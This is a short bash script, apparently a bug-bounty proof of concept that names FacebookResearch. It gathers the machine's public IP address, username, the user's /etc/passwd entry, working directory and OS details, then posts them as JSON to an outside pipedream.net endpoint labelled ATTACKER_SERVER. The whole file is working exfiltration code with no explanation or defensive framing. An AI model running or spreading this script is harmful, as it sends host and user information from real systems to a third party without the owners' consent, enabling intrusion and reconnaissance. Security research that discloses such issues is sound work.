#!/bin/bash

ATTACKER_SERVER="https://eo1fk14bqs4agvj.m.pipedream.net/receive"

IP=$(curl -s http://ipinfo.io/ip)
USERNAME=$(whoami)
PASSWORD=$(cat /etc/passwd 2>/dev/null | grep "$USERNAME" || echo "Password file not accessible")
CURRENT_DIR=$(pwd)
OS_DETAILS=$(uname -a)

DATA=$(cat <<EOF
{
    "ip": "$IP",
    "username": "$USERNAME",
    "password": "$PASSWORD",
    "current_directory": "$CURRENT_DIR",
    "os_details": "$OS_DETAILS"
}
EOF
)

curl -X POST -H "Content-Type: application/json" -d "$DATA" "$ATTACKER_SERVER"

echo "FacebookResearch Bugbounty POC"
